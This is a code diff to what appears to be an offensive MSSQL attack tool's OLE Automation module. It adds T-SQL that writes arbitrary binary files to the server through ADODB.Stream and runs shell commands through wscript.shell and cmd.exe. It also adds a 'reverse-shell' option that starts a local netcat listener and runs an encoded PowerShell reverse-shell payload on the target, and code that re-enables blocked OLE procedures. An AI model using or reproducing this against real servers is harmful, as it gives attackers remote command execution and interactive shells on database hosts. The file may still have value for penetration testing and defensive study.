@@ -3,8 +3,9 @@
 
 import logging
 from Mssql import Mssql
-from Utils import cleanString, ErrorClass, checkOptionsGivenByTheUser, getDataFromFile, putDataToFile
+from Utils import cleanString, ErrorClass, checkOptionsGivenByTheUser, putDataToFile, getBinaryDataFromFile, runListenNC, getPSReverseShellCodeEncoded
 from Constants import *
+from threading import Thread
 
 class OleAutomation (Mssql):
 	'''
@@ -34,10 +35,19 @@ class OleAutomation (Mssql):
 	REQ_WRITE_FILE = """declare @o int, @f int, @t int, @ret int
 						exec sp_oacreate 'scripting.filesystemobject', @o out
 						exec sp_oamethod @o, 'createtextfile', @f out, '{0}', 1
-						exec @ret = sp_oamethod @f, 'writeline', NULL, '{1}'"""#{0} filename, {1}data	
+						exec @ret = sp_oamethod @f, 'writeline', NULL, '{1}'"""#{0} filename, {1}data
 	REQ_EXEC_SYS_CMD = """DECLARE @shell INT
-						EXEC sp_oacreate 'wscript.shell', @shell output
-						EXEC sp_oamethod @shell, 'run', null, '{0}', '0','{1}'"""#{0} cmd, {1} wait
+						EXEC sp_oacreate 'wscript.shell', @shell output, 5
+						EXEC sp_oamethod @shell, 'run', null, 'cmd.exe /c "{0}"'"""#{0} cmd
+	REQ_WRITE_FILE_BINARY = """ DECLARE @Obj INT;
+								EXEC sp_OACreate 'ADODB.Stream' ,@Obj OUTPUT;
+								EXEC sp_OASetProperty @Obj ,'Type',1;
+								EXEC sp_OAMethod @Obj,'Open';
+								EXEC sp_OAMethod @Obj,'Write', NULL, {1};
+								EXEC sp_OAMethod @Obj,'SaveToFile', NULL, '{0}', 2;
+								EXEC sp_OAMethod @Obj,'Close';
+								EXEC sp_OADestroy @Obj;"""#{0} filename, {1}data
+	
 	
 	def __init__(self, args):
 		'''
@@ -119,27 +129,60 @@ class OleAutomation (Mssql):
 		logging.info("The {0} file has been created".format(filename))
 		return True
 		
+	def writeFileBinary (self, filename, data):
+		'''
+		To writre file
+		If return True, file created, otherwise, return an error
+		'''
+		logging.info("Writing the {0} file via Ole Automation in T-SQL ...".format(filename))
+		data = self.executeRequest(self.REQ_WRITE_FILE_BINARY.format(filename, data), noResult=True)
+		if isinstance(data,Exception):
+			if ERROR_PROCEDURE_BLOCKED in str(data) :
+				status = self.enableOLEAutomationProcedures()
+				if isinstance(status,Exception):
+					logging.info("I try to re-enable OLE automation but always impossible to write the file : {0}".format(status))
+					return status
+				else : return self.readFile(filename)
+			else :
+				logging.info("Impossible to write the file: {0}".format(data))
+				return data
+		logging.info("The {0} file has been created".format(filename))
+		return True
+		
 	def executeSysCmd (self, cmd, wait=True):
 		'''
 		Execute a system command
 		Return True if ok, otherwise an error
 		'''
 		logging.info("Executing the '{0}' cmd via Ole Automation in T-SQL ...".format(cmd))
-		data = self.executeRequest(self.REQ_EXEC_SYS_CMD.format(cmd, wait), noResult=False)
+		data = self.executeRequest(self.REQ_EXEC_SYS_CMD.format(cmd), noResult=False)
 		if isinstance(data,Exception): 
 			logging.info("Impossible to execute system command: {0}".format(data))
 			return data
 		logging.info("The system command '{0}' has been executed".format(cmd))
 		return True
 		
+	'''
+	def __put0x(self, rawData):
+		"""
+		put 0x before head byte and return hex string
+		"""
+		hexString = ""
+		for aByte in rawData:
+			hexString += "0x"+aByte.encode('hex')
+		return hexString
+	'''
+		
+			
 	def putFile (self, localFile, remoteFile):
 		'''
 		Put the file localFile on the remote file remoteFile
 		Return True if ok, otherwise an error
 		'''
 		logging.info("Copying the local file {0} to {1}".format(localFile, remoteFile))
-		data = getDataFromFile(localFile)
-		status = self.writeFile (remoteFile, data)
+		data = getBinaryDataFromFile(localFile)
+		dataEncoded = "0x"+data.encode('hex')
+		status = self.writeFileBinary(remoteFile, dataEncoded)
 		if isinstance(status,Exception):
 			logging.info("Impossible to create the remote file {0}".format(remoteFile))
 			return status
@@ -181,13 +224,31 @@ class OleAutomation (Mssql):
 			self.args['print'].goodNews("OK")
 		else:
 			self.args['print'].badNews("KO")
+
+	def getInteractiveReverseShell(self, localip, localport):
+		'''
+		Give you an interactive reverse shell with powershell command
+		Returns True if no error
+		Returns exception if error
+		'''
+		logging.info("The powershell reverse shell tries to connect to {0}:{1}".format(localip,localport))
+		a = Thread(None, runListenNC, None, (), {'port':localport})
+		a.start()
+		cmdAndPayload = getPSReverseShellCodeEncoded(ip=localip, port=localport)
+		try :
+			status = self.executeSysCmd(cmd=cmdAndPayload)
+			if isinstance(status,Exception):
+				return status
+		except KeyboardInterrupt:
+			pass
+		return True
 		
 		
 def runOleAutomationModule(args):
 	'''
 	Run the runOleAutomation module
 	'''
-	if checkOptionsGivenByTheUser(args,["read-file","write-file","get-file","put-file","exec-sys-cmd","enable-ole-automation","disable-ole-automation"],checkAccount=True) == False : return EXIT_MISS_ARGUMENT
+	if checkOptionsGivenByTheUser(args,["read-file","write-file","get-file","put-file","exec-sys-cmd","enable-ole-automation","disable-ole-automation", "reverse-shell"],checkAccount=True) == False : return EXIT_MISS_ARGUMENT
 	oleAutomation = OleAutomation(args)
 	oleAutomation.connect()
 	if args["test-module"] == True: oleAutomation.testAll()
@@ -240,4 +301,7 @@ def runOleAutomationModule(args):
 			args['print'].badNews("Impossible to disable OLE Automation: '{0}'".format(status))
 		else:
 			args['print'].goodNews("OLE Automation is disabled")
+	if args["reverse-shell"] != None:
+		args['print'].title("Try to give you a reverse shell with OLE Automation")
+		status = oleAutomation.getInteractiveReverseShell(args['reverse-shell'][0], args['reverse-shell'][1])
 	oleAutomation.closeConnection()
